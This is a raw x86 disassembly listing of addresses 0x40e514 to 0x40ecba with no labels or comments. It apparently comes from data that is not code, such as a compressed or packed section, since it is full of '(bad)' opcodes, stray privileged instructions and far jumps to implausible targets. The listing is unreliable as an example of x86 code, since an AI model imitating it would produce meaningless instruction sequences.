  40e514:	and    BYTE PTR [esi-0x35],0xe1
  40e518:	outs   dx,DWORD PTR ds:[esi]
  40e519:	pop    ebp
  40e51a:	ins    BYTE PTR es:[di],dx
  40e51c:	(bad)  
  40e51d:	lods   eax,DWORD PTR ds:[esi]
  40e51e:	dec    ebx
  40e51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e520:	fs sbb al,0xd3
  40e523:	mov    BYTE PTR [esi],dh
  40e525:	mov    al,0xbd
  40e527:	or     ecx,DWORD PTR [ebp-0x7f]
  40e52a:	mov    DWORD PTR [ebp+0x7d],edi
  40e52d:	cmp    esp,DWORD PTR [ecx]
  40e52f:	ss sub eax,0xe8a623e4
  40e535:	ins    DWORD PTR es:[edi],dx
  40e536:	or     eax,0xd55924ab
  40e53b:	xor    eax,0xa4983964
  40e540:	pop    ecx
  40e541:	inc    ebp
  40e542:	pop    es
  40e543:	les    ebp,FWORD PTR [esi+0x48]
  40e546:	or     DWORD PTR [eax+eax*4],eax
  40e549:	xor    DWORD PTR [ecx+0x2cc1d6e],0xffffff84
  40e550:	test   eax,0xe212db8a
  40e555:	in     eax,0xd6
  40e557:	pop    esp
  40e558:	rcr    bh,1
  40e55a:	ret    0x2ace
  40e55d:	retf   
  40e55e:	xlat   BYTE PTR ds:[ebx]
  40e55f:	je     0x40e54a
  40e561:	dec    ecx
  40e562:	dec    ecx
  40e563:	xchg   edi,eax
  40e564:	push   edi
  40e565:	std    
  40e566:	or     esp,DWORD PTR [ecx]
  40e568:	xchg   edx,eax
  40e569:	bound  ebx,QWORD PTR [esi+0x28aae4fd]
  40e56f:	(bad)  
  40e570:	test   al,0x5c
  40e572:	sub    ch,BYTE PTR [ebx+0xbf57852]
  40e578:	leave  
  40e579:	jge    0x40e561
  40e57b:	adc    dh,BYTE PTR [esi+ebx*2+0x191c1701]
  40e582:	fstp   DWORD PTR [eax+0x16e93828]
  40e588:	je     0x40e5b4
  40e58a:	hlt    
  40e58b:	sub    esi,DWORD PTR [eax-0x68b54989]
  40e591:	mov    WORD PTR gs:0x3fd08866,gs
  40e598:	aas    
  40e599:	add    BYTE PTR [ecx],al
  40e59b:	mov    eax,ds:0xaee892ba
  40e5a0:	cmp    BYTE PTR [edi-0x62775408],bl
  40e5a6:	call   0xf082c845
  40e5ab:	mov    ds:0x70d77994,eax
  40e5b0:	mov    esp,0x69838404
  40e5b5:	pop    eax
  40e5b6:	mov    cl,0xcd
  40e5b8:	adc    BYTE PTR [ebx-0x58584e73],ch
  40e5be:	xor    edx,esi
  40e5c0:	or     al,0x1
  40e5c2:	sbb    al,BYTE PTR [edi+0x44]
  40e5c5:	rcr    BYTE PTR [ebx+0x69],0x4b
  40e5c9:	fadd   st(0),st
  40e5cb:	jae    0x40e63e
  40e5cd:	int    0xef
  40e5cf:	sub    BYTE PTR [esi+0x63],bh
  40e5d2:	pop    ebp
  40e5d3:	mov    al,0xc4
  40e5d5:	call   0x1bffdc12
  40e5da:	dec    esp
  40e5db:	aaa    
  40e5dc:	rol    DWORD PTR [edx-0xfd5d9a6],0xf3
  40e5e3:	call   0x7940:0x94511c4
  40e5ea:	push   ds
  40e5eb:	inc    esp
  40e5ec:	cmp    bh,cl
  40e5ee:	jb     0x40e58b
  40e5f0:	(bad)  
  40e5f1:	mov    ds:0x9161ebc4,al
  40e5f6:	aas    
  40e5f7:	mov    cs,esi
  40e5f9:	mov    ?,WORD PTR [edi]
  40e5fb:	mov    esp,0xbe927fe3
  40e600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e601:	mov    WORD PTR [edi],gs
  40e603:	arpl   WORD PTR [eax+0x22],ax
  40e606:	mov    DWORD PTR [ebx],eax
  40e608:	inc    eax
  40e609:	ficomp WORD PTR [edi]
  40e60b:	jae    0x40e5be
  40e60d:	popa   
  40e60e:	jnp    0x40e626
  40e610:	xchg   edi,eax
  40e611:	lods   eax,DWORD PTR ds:[esi]
  40e612:	sahf   
  40e613:	fdiv   QWORD PTR [esi+ecx*8]
  40e616:	in     eax,0xd
  40e618:	mov    al,0x67
  40e61a:	jno    0x40e693
  40e61c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e61d:	mov    esp,0xe98beaa3
  40e622:	mov    WORD PTR [edx],cs
  40e624:	iret   
  40e625:	add    eax,0x58a096a
  40e62a:	sub    esp,DWORD PTR [edi+0x1a3aabdd]
  40e630:	std    
  40e631:	xchg   esi,eax
  40e632:	push   edi
  40e633:	retf   
  40e634:	fldenv [edx]
  40e636:	jle    0x40e675
  40e638:	out    0x65,al
  40e63a:	cld    
  40e63b:	inc    esi
  40e63c:	mov    bl,0xce
  40e63e:	ret    
  40e63f:	or     ebx,DWORD PTR [ecx+0xe]
  40e642:	adc    al,0xe3
  40e644:	mov    ecx,0xa28e2769
  40e649:	adc    eax,0x67e47894
  40e64e:	mov    al,0x3c
  40e650:	xchg   esp,eax
  40e651:	call   0x1c3:0x6800
  40e657:	pop    ds
  40e658:	in     eax,0xe5
  40e65a:	cmc    
  40e65b:	lahf   
  40e65c:	iret   
  40e65d:	lahf   
  40e65e:	pop    ds
  40e65f:	call   0x1edd:0x7ef8702e
  40e666:	jne    0x40e5ee
  40e668:	push   ds
  40e669:	cli    
  40e66a:	ins    BYTE PTR es:[edi],dx
  40e66b:	nop
  40e66c:	outs   dx,DWORD PTR ds:[esi]
  40e66d:	dec    ebp
  40e66e:	pushf  
  40e66f:	mov    ds:0xe02c9fb2,al
  40e674:	jmp    0x40e635
  40e676:	fxch   st(2)
  40e678:	in     eax,0x17
  40e67a:	jg     0x40e624
  40e67c:	dec    edx
  40e67d:	add    DWORD PTR [ebx],ebp
  40e67f:	jmp    0xa47b:0x816750ca
  40e686:	pop    es
  40e687:	ror    ebx,1
  40e689:	adc    cl,BYTE PTR [ebx+ecx*8-0x4]
  40e68d:	add    eax,0xfa12b90e
  40e692:	and    esp,DWORD PTR [ebx-0x79]
  40e695:	pop    edx
  40e696:	mov    dh,BYTE PTR [eax+esi*2+0x48452849]
  40e69d:	mov    dh,0xd7
  40e69f:	dec    esi
  40e6a0:	jg     0x40e6ac
  40e6a2:	add    ecx,DWORD PTR [ebx-0x7b74b341]
  40e6a8:	lds    eax,FWORD PTR [ebx-0x5373e147]
  40e6ae:	adc    BYTE PTR [ebx+0x5507d249],al
  40e6b4:	out    dx,eax
  40e6b5:	cmp    BYTE PTR [ecx],ah
  40e6b7:	inc    edx
  40e6b8:	pop    ds
  40e6b9:	ret    0xab28
  40e6bc:	xchg   BYTE PTR [ebp+0x9],dl
  40e6bf:	sub    BYTE PTR [ecx+0x699426e4],ch
  40e6c5:	fistp  WORD PTR [ecx+0x6b84c36d]
  40e6cb:	or     eax,0xa10da709
  40e6d0:	jl     0x40e687
  40e6d2:	sub    ecx,DWORD PTR [edx+0x16]
  40e6d5:	ficomp DWORD PTR [edx+0x5d]
  40e6d8:	je     0x40e68b
  40e6da:	sub    eax,0xd9754497
  40e6df:	cmp    BYTE PTR fs:[eax+0x60bc57ad],ch
  40e6e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6e7:	repnz inc ecx
  40e6e9:	xchg   edx,eax
  40e6ea:	adc    DWORD PTR [ebp+0x376009b1],0x30
  40e6f1:	scas   eax,DWORD PTR es:[edi]
  40e6f2:	xor    ebp,edi
  40e6f4:	add    al,0x88
  40e6f6:	xchg   ecx,eax
  40e6f7:	pop    eax
  40e6f8:	std    
  40e6f9:	in     eax,dx
  40e6fa:	push   ebp
  40e6fb:	cwde   
  40e6fc:	fldcw  WORD PTR [edx*2-0x44d87c3b]
  40e703:	rcl    BYTE PTR [edi+edi*4],1
  40e706:	dec    edi
  40e707:	jmp    0x40e71a
  40e709:	sbb    BYTE PTR [edi+0x1112ad4a],cl
  40e70f:	mov    esi,0xca19ae8
  40e714:	xchg   ebp,eax
  40e715:	arpl   WORD PTR [eax+0x11611483],bx
  40e71b:	fsubr  st(4),st
  40e71d:	repnz (bad) [eax-0x1f]
  40e721:	and    ecx,0xbf88d7b3
  40e727:	clc    
  40e728:	sbb    DWORD PTR [ecx],0xffffffe8
  40e72b:	inc    ecx
  40e72c:	add    dl,BYTE PTR ds:0x39c48d29
  40e732:	sti    
  40e733:	sahf   
  40e734:	add    DWORD PTR [edx],ebp
  40e736:	inc    eax
  40e737:	push   ecx
  40e738:	retf   
  40e739:	jg     0x40e752
  40e73b:	mov    dh,0xaa
  40e73d:	adc    DWORD PTR [eax+0x2a562673],ecx
  40e743:	into   
  40e744:	or     BYTE PTR [edi-0x4fc35106],bl
  40e74a:	cmp    edi,DWORD PTR [edx]
  40e74c:	jns    0x40e78e
  40e74e:	cwde   
  40e74f:	call   0xdcd9:0x1e1f14f1
  40e756:	jo     0x40e77f
  40e758:	push   edi
  40e759:	sar    DWORD PTR [ebx+0x36],0xbc
  40e75d:	loop   0x40e767
  40e75f:	outs   dx,DWORD PTR ds:[esi]
  40e760:	lahf   
  40e761:	shl    edi,cl
  40e763:	xor    DWORD PTR [ebx+0x25],eax
  40e766:	jbe    0x40e779
  40e768:	cli    
  40e769:	lods   al,BYTE PTR ds:[esi]
  40e76a:	les    ecx,FWORD PTR [ebx+0x2b]
  40e76d:	lds    ebx,FWORD PTR [edi+0x11596011]
  40e773:	loopne 0x40e7d3
  40e775:	jp     0x40e725
  40e777:	mov    WORD PTR [edx],gs
  40e779:	mov    dl,BYTE PTR [edi+0x113064fc]
  40e77f:	pop    ebp
  40e780:	aaa    
  40e781:	jne    0x40e79f
  40e783:	cmp    DWORD PTR [esi+ebx*2-0x772b5cbf],ebp
  40e78a:	jmp    0xdf44862e
  40e78f:	fbld   TBYTE PTR [ecx]
  40e791:	cli    
  40e792:	sbb    ebp,ebp
  40e794:	bound  eax,QWORD PTR [ebx-0x76]
  40e797:	and    esp,DWORD PTR ds:0x93908d1e
  40e79d:	xchg   ebx,eax
  40e79e:	add    eax,DWORD PTR [edx+0x3178b004]
  40e7a4:	xor    bl,BYTE PTR [edx-0x37]
  40e7a7:	test   eax,0x15577229
  40e7ac:	xor    DWORD PTR [ebp+0x5b30322],ebp
  40e7b2:	retf   0x9c1a
  40e7b5:	shl    BYTE PTR [ebx+0x3ea96f30],1
  40e7bb:	sub    BYTE PTR [edi-0x6dc077c8],0xa6
  40e7c2:	jmp    0x99f7c7fc
  40e7c7:	pop    ss
  40e7c8:	inc    esp
  40e7c9:	xchg   edx,eax
  40e7ca:	fistp  DWORD PTR [ebp+0x69]
  40e7cd:	ds ds jnp 0x40e835
  40e7d1:	mov    ah,0x15
  40e7d3:	popf   
  40e7d4:	pop    ebp
  40e7d5:	jae    0x40e7e9
  40e7d7:	sar    dl,cl
  40e7d9:	mov    esp,0xe5e46e
  40e7de:	test   al,0x7c
  40e7e0:	stc    
  40e7e1:	and    al,0x2e
  40e7e3:	push   esp
  40e7e4:	pop    ebx
  40e7e5:	sti    
  40e7e6:	inc    eax
  40e7e7:	inc    BYTE PTR [eax-0x466e9e4f]
  40e7ed:	jp     0x40e806
  40e7ef:	dec    esi
  40e7f0:	xor    ebp,ebp
  40e7f2:	aaa    
  40e7f3:	aas    
  40e7f4:	cmc    
  40e7f5:	push   esp
  40e7f6:	loopne 0x40e7b9
  40e7f8:	jbe    0x40e804
  40e7fa:	and    eax,0x2df21158
  40e7ff:	jo     0x40e850
  40e801:	sub    BYTE PTR [esi],ch
  40e803:	xor    DWORD PTR ds:0x574b8d0d,esp
  40e809:	in     al,dx
  40e80a:	push   ebx
  40e80b:	sub    BYTE PTR [esi+0x31084d77],al
  40e811:	ret    
  40e812:	cmc    
  40e813:	adc    eax,0x91872e4
  40e818:	fld    QWORD PTR [ebx-0x71]
  40e81b:	lods   al,BYTE PTR ds:[esi]
  40e81c:	stc    
  40e81d:	mov    ecx,0x8194281e
  40e822:	and    cl,ch
  40e824:	inc    edi
  40e825:	push   edx
  40e826:	repnz outs dx,BYTE PTR ds:[esi]
  40e828:	int    0xb7
  40e82a:	or     BYTE PTR [ecx+0x31],0xe5
  40e82e:	rol    DWORD PTR [ebp-0xa],1
  40e831:	icebp  
  40e832:	dec    esp
  40e833:	retf   0xf8e4
  40e836:	mov    edi,0x79633f43
  40e83b:	fninit 
  40e83d:	into   
  40e83e:	sub    DWORD PTR [ecx],edx
  40e840:	clc    
  40e841:	popf   
  40e842:	retf   0xff00
  40e845:	test   DWORD PTR [eax-0x4c1eec27],edi
  40e84b:	dec    ecx
  40e84c:	(bad)  
  40e84d:	fild   DWORD PTR [ebx]
  40e84f:	xor    ebx,esi
  40e851:	pop    ds
  40e852:	popa   
  40e853:	aad    0xed
  40e855:	pop    ecx
  40e856:	stos   DWORD PTR es:[edi],eax
  40e857:	sbb    al,0xa1
  40e859:	add    eax,0x31a1c005
  40e85e:	in     eax,0x0
  40e860:	mov    esi,0xed32cee0
  40e865:	or     cl,BYTE PTR ds:0xe1f8f02a
  40e86b:	adc    eax,0x5292c410
  40e870:	cmpps  xmm6,xmm7,0x5e
  40e874:	inc    esi
  40e875:	or     DWORD PTR [esp+esi*4+0x3c],esi
  40e879:	add    eax,0x3108b88b
  40e87e:	dec    ebx
  40e87f:	inc    ecx
  40e880:	mov    bh,0xeb
  40e882:	js     0x40e8d7
  40e884:	xchg   DWORD PTR [esi-0x1635e48f],edx
  40e88a:	xchg   edi,eax
  40e88b:	in     al,dx
  40e88c:	sbb    al,0x81
  40e88e:	pusha  
  40e88f:	int3   
  40e890:	xchg   ecx,edi
  40e892:	xor    ebx,eax
  40e894:	push   esp
  40e895:	mov    dh,0x2a
  40e897:	aad    0x64
  40e899:	out    0x6f,eax
  40e89b:	(bad)  
  40e89c:	idiv   dl
  40e89e:	push   ebp
  40e89f:	(bad)  
  40e8a0:	pop    edi
  40e8a1:	and    eax,DWORD PTR [eax+0x4f]
  40e8a4:	or     ebp,eax
  40e8a6:	popa   
  40e8a7:	sti    
  40e8a8:	dec    ebp
  40e8a9:	xor    al,0x7c
  40e8ab:	int3   
  40e8ac:	mov    ebx,DWORD PTR [eax-0x10]
  40e8af:	and    bh,BYTE PTR [edi]
  40e8b1:	retf   0x8bf1
  40e8b4:	or     bh,ah
  40e8b6:	outs   dx,BYTE PTR ds:[esi]
  40e8b7:	mov    eax,0xaa8e3dd6
  40e8bc:	fdiv   QWORD PTR [edx+0x3e]
  40e8bf:	cli    
  40e8c0:	out    dx,eax
  40e8c1:	mov    ebp,0x1eafb71b
  40e8c6:	ret    0x1057
  40e8c9:	push   edx
  40e8ca:	mov    esi,0xe1c4b088
  40e8cf:	stos   BYTE PTR es:[edi],al
  40e8d0:	loopne 0x40e876
  40e8d2:	es popf 
  40e8d4:	cmp    ebx,edi
  40e8d6:	daa    
  40e8d7:	mov    bh,0x86
  40e8d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8da:	int3   
  40e8db:	mov    gs,WORD PTR [edi+0x7cd5903f]
  40e8e1:	repnz pusha 
  40e8e3:	shl    ah,0x2d
  40e8e6:	xchg   BYTE PTR [ebx-0x29],al
  40e8e9:	adc    BYTE PTR [edi],bh
  40e8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ec:	add    DWORD PTR [ebp+0x6c],0xb5cd6ef9
  40e8f3:	(bad)  
  40e8f4:	jmp    0x33f7:0xcb851bb2
  40e8fb:	pop    es
  40e8fc:	lds    eax,FWORD PTR [edi-0x588abf0a]
  40e902:	or     DWORD PTR ds:0xdbc40a0b,esi
  40e908:	mov    ebp,0xe99f6591
  40e90d:	popa   
  40e90e:	mov    al,ds:0xbd0f2eff
  40e913:	fdivr  st,st(0)
  40e915:	fdiv   QWORD PTR [edi]
  40e917:	aad    0x46
  40e919:	fild   DWORD PTR gs:[esp+ecx*4+0x2c]
  40e91e:	ja     0x40e971
  40e920:	mov    ecx,0x50827643
  40e925:	push   ecx
  40e926:	mov    esi,0x2ea0d257
  40e92b:	pop    ebp
  40e92c:	pop    ecx
  40e92d:	push   es
  40e92e:	aam    0xae
  40e930:	mov    es,WORD PTR [esi]
  40e932:	fld    TBYTE PTR ds:0xdc1d8af4
  40e938:	es cs in al,dx
  40e93b:	fistp  DWORD PTR [ebx-0x7b5fba4a]
  40e941:	fidivr WORD PTR [eax]
  40e943:	jae    0x40e993
  40e945:	xchg   esp,eax
  40e946:	(bad)
  40e949:	js     0x40e965
  40e94b:	or     ecx,DWORD PTR [edi+edi*4]
  40e94e:	mov    dl,0x9b
  40e950:	add    ebp,eax
  40e952:	lea    esi,[ecx-0xe01f5ac]
  40e958:	and    BYTE PTR ds:0x3de66af3,0xe7
  40e95f:	push   0xffffffdf
  40e961:	or     eax,edi
  40e963:	pop    edi
  40e964:	gs call 0xb13:0x13322c4c
  40e96c:	les    ecx,FWORD PTR [edx]
  40e96e:	fdiv   QWORD PTR [eax+ebx*8]
  40e971:	out    0x54,al
  40e973:	(bad)  
  40e974:	xchg   esp,eax
  40e975:	jo     0x40e8f7
  40e977:	lahf   
  40e978:	out    dx,al
  40e979:	cmp    eax,0xaf1c1baa
  40e97e:	leave  
  40e97f:	fcomp  QWORD PTR [ebx-0x23]
  40e982:	push   edx
  40e983:	(bad)
  40e986:	sbb    BYTE PTR [esp+ebp*2-0x62],al
  40e98a:	cli    
  40e98b:	pusha  
  40e98c:	(bad)  
  40e98d:	mov    ds:0x879fda29,eax
  40e992:	fisubr DWORD PTR [edx]
  40e994:	daa    
  40e995:	lods   al,BYTE PTR ds:[esi]
  40e996:	jecxz  0x40e980
  40e998:	aam    0xb3
  40e99a:	xor    eax,0xc96ff69f
  40e99f:	add    eax,0xc2821041
  40e9a4:	stos   DWORD PTR es:[edi],eax
  40e9a5:	push   esi
  40e9a6:	push   ebp
  40e9a7:	pop    edi
  40e9a8:	inc    ecx
  40e9a9:	ror    DWORD PTR [eax+0x1b86e2ed],1
  40e9af:	pop    es
  40e9b0:	pop    ecx
  40e9b1:	enter  0x5a47,0x38
  40e9b5:	mov    bl,0xc
  40e9b7:	inc    edx
  40e9b8:	pusha  
  40e9b9:	call   0x8b0ca6c7
  40e9be:	mov    bl,BYTE PTR [esi+0x21]
  40e9c1:	imul   esp,DWORD PTR [eax+edx*2-0x798bed8a],0x7
  40e9c9:	and    eax,0xa1b475dd
  40e9ce:	fwait
  40e9cf:	dec    eax
  40e9d0:	bound  esi,QWORD PTR [edx-0x4d]
  40e9d3:	jg     0x40e98e
  40e9d5:	mov    edx,0x56836723
  40e9da:	sbb    dl,ch
  40e9dc:	push   edx
  40e9dd:	and    DWORD PTR [edx+0xe5ef6bc],esp
  40e9e3:	pushf  
  40e9e4:	jmp    0xf6e3eae4
  40e9e9:	fs call 0xa5ba:0xced379da
  40e9f1:	cmp    ebx,DWORD PTR [esp+ebx*4]
  40e9f4:	or     dh,cl
  40e9f6:	ins    BYTE PTR es:[edi],dx
  40e9f7:	retf   0x6853
  40e9fa:	pop    esp
  40e9fb:	ins    DWORD PTR es:[edi],dx
  40e9fc:	sbb    esi,DWORD PTR [edx-0x31f86a3]
  40ea02:	mov    DWORD PTR [ebp-0x3379324],edx
  40ea08:	aaa    
  40ea09:	push   ecx
  40ea0a:	scas   al,BYTE PTR es:[edi]
  40ea0b:	(bad)  
  40ea0c:	mov    ebx,DWORD PTR [esi-0x70018b2]
  40ea12:	mov    eax,0x30a9e547
  40ea17:	cmp    ebx,DWORD PTR [ebx]
  40ea19:	call   0x819b6059
  40ea1e:	pop    ds
  40ea1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea20:	sbb    BYTE PTR [ebx],bl
  40ea22:	adc    eax,0x5cf2e11d
  40ea27:	daa    
  40ea28:	ret    
  40ea29:	pop    esp
  40ea2a:	xchg   ebp,eax
  40ea2b:	retf   0xdd40
  40ea2e:	jbe    0x40e9b6
  40ea30:	mov    eax,ds:0x69db3a3c
  40ea35:	fisubr DWORD PTR [edx]
  40ea37:	test   al,0x63
  40ea39:	(bad)  
  40ea3a:	jl     0x40eaaf
  40ea3c:	sub    eax,0xdbdc45e9
  40ea41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea42:	mov    edi,0x8f4baaa7
  40ea47:	gs pop ebx
  40ea49:	int    0x31
  40ea4b:	sub    dh,BYTE PTR [ebx]
  40ea4d:	pop    eax
  40ea4e:	shr    DWORD PTR [esi-0x73],cl
  40ea51:	lock fild DWORD PTR [ecx-0x4f]
  40ea55:	std    
  40ea56:	das    
  40ea57:	push   ecx
  40ea58:	test   DWORD PTR [edi+ebx*8],0xde20fb59
  40ea5f:	ins    BYTE PTR es:[edi],dx
  40ea60:	add    dh,BYTE PTR [edx+0x7c]
  40ea63:	xor    DWORD PTR [esi-0x32],esp
  40ea66:	push   es
  40ea67:	leave  
  40ea68:	mov    edx,0xd7e15d9b
  40ea6d:	jae    0x40ea43
  40ea6f:	repz in al,dx
  40ea71:	inc    ebx
  40ea72:	xor    DWORD PTR [ebp+0x7741b38a],edx
  40ea78:	fbstp  TBYTE PTR [edx+0x1a]
  40ea7b:	or     DWORD PTR [ebx+edi*4],ebx
  40ea7e:	push   ebp
  40ea7f:	ss stos DWORD PTR es:[edi],eax
  40ea81:	pusha  
  40ea82:	js     0x40ea2c
  40ea84:	and    eax,0x59766be4
  40ea89:	(bad)  
  40ea8a:	test   al,0x4c
  40ea8c:	cld    
  40ea8d:	push   0xfffffff7
  40ea8f:	fld    TBYTE PTR [esi-0x273aacf]
  40ea95:	lods   eax,DWORD PTR ds:[esi]
  40ea96:	scas   al,BYTE PTR es:[edi]
  40ea97:	call   0x25e5:0x17c5c3d9
  40ea9e:	jno    0x40eaf3
  40eaa0:	or     DWORD PTR [ebp-0x3f],esp
  40eaa3:	outs   dx,BYTE PTR ds:[esi]
  40eaa4:	or     BYTE PTR [eax],bl
  40eaa6:	pop    ebx
  40eaa7:	jno    0x40eaa1
  40eaa9:	dec    eax
  40eaaa:	fldlg2 
  40eaac:	(bad)  
  40eaad:	das    
  40eaae:	mov    BYTE PTR cs:[esi-0x35c967d5],ah
  40eab5:	aam    0xc8
  40eab7:	pop    ebx
  40eab8:	jmp    0xe7ea:0x8a3abcdf
  40eabf:	data16 arpl WORD PTR [edx+0x7],di
  40eac3:	(bad)  
  40eac4:	int    0x92
  40eac6:	pushf  
  40eac7:	leave  
  40eac8:	scas   al,BYTE PTR es:[edi]
  40eac9:	sti    
  40eaca:	data16 mov ch,0x1
  40eacd:	dec    ecx
  40eace:	in     al,dx
  40eacf:	xor    bh,ah
  40ead1:	cdq    
  40ead2:	jle    0x40eaa1
  40ead4:	leave  
  40ead5:	adc    edx,DWORD PTR [ecx-0x63]
  40ead8:	jb     0x40eb01
  40eada:	pop    ss
  40eadb:	mov    dl,0x84
  40eadd:	xor    ebp,DWORD PTR [ebx]
  40eadf:	cmp    BYTE PTR [ebx],ch
  40eae1:	add    cl,BYTE PTR [ecx-0x58]
  40eae4:	ret    
  40eae5:	rol    BYTE PTR [ecx+0x5f],cl
  40eae8:	push   esp
  40eae9:	push   eax
  40eaea:	add    BYTE PTR [ebp+0x19],0x6c
  40eaee:	sbb    esp,0x0
  40eaf1:	pop    edi
  40eaf2:	popa   
  40eaf3:	sub    BYTE PTR [esi+eax*4-0xb04a497],bh
  40eafa:	fwait
  40eafb:	push   0x76
  40eafd:	lds    esp,FWORD PTR [edi-0x726f0840]
  40eb03:	mov    esp,0x5399ce02
  40eb08:	add    eax,0x4e55924c
  40eb0d:	les    ebx,FWORD PTR ds:0x3b01ffb1
  40eb13:	stc    
  40eb14:	mov    fs,esi
  40eb16:	cmp    BYTE PTR [ebp-0x5a608e91],0x26
  40eb1d:	or     al,0x54
  40eb1f:	fimul  WORD PTR [esi+0x2ad32a51]
  40eb25:	add    DWORD PTR [ebx],eax
  40eb27:	out    dx,al
  40eb28:	jge    0x40eabc
  40eb2a:	inc    edx
  40eb2b:	hlt    
  40eb2c:	aaa    
  40eb2d:	pop    esp
  40eb2e:	and    BYTE PTR [eax],ch
  40eb30:	inc    edi
  40eb31:	fisubr WORD PTR ds:0xc1c300d7
  40eb37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb38:	sbb    esp,DWORD PTR [ebp-0x71]
  40eb3b:	adc    esp,DWORD PTR [edx+0x38787b99]
  40eb41:	fisub  DWORD PTR [esi+0x72091f4]
  40eb47:	retf   0xe675
  40eb4a:	mov    ebx,0x58b687ed
  40eb4f:	sub    dh,BYTE PTR [ecx+0x64]
  40eb52:	adc    ecx,DWORD PTR [edx+0x285b1a71]
  40eb58:	add    eax,0xe150c6a2
  40eb5d:	ficomp WORD PTR [ecx-0x591a00a0]
  40eb63:	inc    ebx
  40eb64:	pop    eax
  40eb65:	and    BYTE PTR [ecx-0x6ff312d5],ah
  40eb6b:	cmp    BYTE PTR [edx],0x54
  40eb6e:	into   
  40eb6f:	mov    cl,0x30
  40eb71:	test   BYTE PTR [esi+0x471b5a36],ah
  40eb77:	bound  ecx,QWORD PTR [eax+0x7eed6a45]
  40eb7d:	mov    eax,ds:0xa1d8e668
  40eb82:	out    0x39,al
  40eb84:	outs   dx,BYTE PTR ds:[esi]
  40eb85:	pop    es
  40eb86:	inc    ecx
  40eb87:	les    ebp,FWORD PTR [ebx-0x3846b816]
  40eb8d:	mov    dl,0x8d
  40eb8f:	mov    eax,0x3d33d9c1
  40eb94:	leave  
  40eb95:	mov    es,WORD PTR [eax-0x16e85d7b]
  40eb9b:	outs   dx,DWORD PTR ds:[esi]
  40eb9c:	sub    ch,BYTE PTR ds:0x33606eb7
  40eba2:	les    ebx,FWORD PTR ds:0xb81416fb
  40eba8:	push   cs
  40eba9:	xchg   ebx,eax
  40ebaa:	ret    
  40ebab:	sub    DWORD PTR [eax+esi*4-0x32],0xffffff98
  40ebb0:	fcom   st(0)
  40ebb2:	aaa    
  40ebb3:	pop    esp
  40ebb4:	mov    bh,0x48
  40ebb6:	imul   eax,ebp,0x8db0879e
  40ebbc:	push   0xf941c4e1
  40ebc1:	adc    DWORD PTR [edx],0xffffff9e
  40ebc4:	dec    esp
  40ebc5:	aad    0x67
  40ebc7:	inc    esp
  40ebc8:	sbb    DWORD PTR [edi+0x1f],esp
  40ebcb:	mov    dl,dh
  40ebcd:	mov    edx,0x503a2e80
  40ebd2:	gs xchg ebp,eax
  40ebd4:	mul    DWORD PTR [edi+0x4f]
  40ebd7:	jmp    0xa7ae:0x7bd8ee1b
  40ebde:	cli    
  40ebdf:	and    eax,0x917f7a0f
  40ebe4:	xchg   ebp,eax
  40ebe5:	or     eax,0xdb3e7afa
  40ebea:	ins    DWORD PTR es:[edi],dx
  40ebeb:	cli    
  40ebec:	retf   0xa694
  40ebef:	out    0xde,al
  40ebf1:	sub    DWORD PTR [edi],ebp
  40ebf3:	sti    
  40ebf4:	mov    dl,0x40
  40ebf6:	mov    ?,WORD PTR [edi-0x4954ca36]
  40ebfc:	imul   ebx,ebx,0x6d
  40ebff:	jmp    0x19a0:0x3111a19f
  40ec06:	or     bh,BYTE PTR [edx+0x7]
  40ec09:	add    al,0x72
  40ec0b:	lods   al,BYTE PTR ds:[esi]
  40ec0c:	repnz gs leave 
  40ec0f:	dec    esp
  40ec10:	(bad)  
  40ec11:	outs   dx,BYTE PTR ds:[esi]
  40ec12:	push   ds
  40ec13:	rcr    esi,cl
  40ec15:	jne    0x40ec36
  40ec17:	inc    bl
  40ec19:	inc    ecx
  40ec1a:	xor    DWORD PTR ds:0xe0eb62c3,0xfffffff0
  40ec21:	shr    DWORD PTR ds:0x9ce5d2c7,0x3f
  40ec28:	push   ecx
  40ec29:	dec    edi
  40ec2a:	mov    dl,0x2a
  40ec2c:	retf   
  40ec2d:	sbb    BYTE PTR [eax-0xa],bl
  40ec30:	push   edx
  40ec31:	popa   
  40ec32:	jb     0x40ec5a
  40ec34:	retf   0x348e
  40ec37:	push   es
  40ec38:	pop    ebp
  40ec39:	cli    
  40ec3a:	imul   esp,esi,0xffffffe6
  40ec3d:	pop    es
  40ec3e:	mov    bl,0xb2
  40ec40:	xchg   esi,eax
  40ec41:	pop    ebx
  40ec42:	ds jmp 0x539c:0xc2b01414
  40ec4a:	adc    DWORD PTR [eax+0x36],eax
  40ec4d:	les    ebx,FWORD PTR [ebp-0x324cfdaa]
  40ec53:	mov    esi,DWORD PTR [ebx+0xb15524e]
  40ec59:	jp     0x40ecd6
  40ec5b:	clc    
  40ec5c:	mov    eax,ds:0x1547b76d
  40ec61:	call   0x85f0:0x947bfb23
  40ec68:	mov    eax,0x5c82be1e
  40ec6d:	push   es
  40ec6e:	pushf  
  40ec6f:	push   cs
  40ec70:	(bad)  
  40ec72:	mov    bl,0x7e
  40ec74:	xchg   BYTE PTR [esi+0x38],al
  40ec77:	fs aas 
  40ec79:	imul   edi,DWORD PTR [edx+0x79a4f40a],0x65e0fe40
  40ec83:	cmp    dh,dl
  40ec85:	popa   
  40ec86:	mov    bh,0x55
  40ec88:	nop
  40ec89:	sub    DWORD PTR [ebp+eax*8+0x66eefba7],edx
  40ec90:	stc    
  40ec91:	pop    ecx
  40ec92:	cmp    edx,DWORD PTR [edi]
  40ec94:	in     eax,0xbf
  40ec96:	cmp    eax,0xa8eccd8a
  40ec9b:	ret    0x54e3
  40ec9e:	lds    eax,FWORD PTR [esi]
  40eca0:	mov    bl,0x75
  40eca2:	out    dx,eax
  40eca3:	dec    esi
  40eca4:	call   0x6d50a84
  40eca9:	cmp    DWORD PTR [eax],edi
  40ecab:	out    0xfd,al
  40ecad:	cld    
  40ecae:	push   0x44
  40ecb0:	popf   
  40ecb1:	loop   0x40ec93
  40ecb3:	fldenv [edi]
  40ecb5:	mov    eax,ds:0xba937b17
  40ecba:	leave  
